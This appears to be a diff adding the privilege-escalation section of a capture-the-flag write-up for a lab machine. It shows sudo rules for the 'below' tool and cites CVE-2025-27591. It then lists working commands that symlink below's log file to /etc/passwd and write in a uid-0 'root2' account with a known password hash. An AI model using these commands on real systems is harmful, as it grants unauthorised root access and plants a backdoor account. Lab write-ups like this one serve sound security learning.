@@ -291,3 +291,34 @@ Thanks!
 
 Mel
 ```
+There we have credentials for the user jacob and we have to find a way to privesc
+```bash
+jacob@outbound:~$ sudo -l
+Matching Defaults entries for jacob on outbound:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jacob may run the following commands on outbound:
+    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
+```
+```bash
+═╣ Services with writable paths? . below.service: Uses relative path 'record' (from ExecStart=/usr/bin/below record --retain-for-s 604800 --compress)                                                                                   
+containerd.service: Uses relative path 'overlay' (from ExecStartPre=-/sbin/modprobe overlay)
+dbus.service: Uses relative path '@dbus-daemon' (from ExecStart=@/usr/bin/dbus-daemon @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only)                                                 
+rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n -iNONE)
+```
+I feel like we have to abuse the below service. 
+I came across this https://access.redhat.com/security/cve/cve-2025-27591 after goolging 'Linux "below service" CVE'
+
+This next part was so difficult that I had to get help from a walkthrough. But basically we had to abuse the linking and creating and account with root priviledges.
+
+```bash
+jacob@outbound:/var/log/below$ echo 'root2:aacFCuAIHhrCM:0:0:,,,:/root:/bin/bash' > root2
+jacob@outbound:/var/log/below$ rm error_root.log 
+jacob@outbound:/var/log/below$ ln -s /etc/passwd /var/log/below/error_root.log
+jacob@outbound:/var/log/below$ sudo /usr/bin/below
+jacob@outbound:/var/log/below$ cp root2 error_root.log 
+jacob@outbound:/var/log/below$ su root2
+Password: 1
+```
+Was this easy? I'd say it was fairly straight forward until the privESC. 
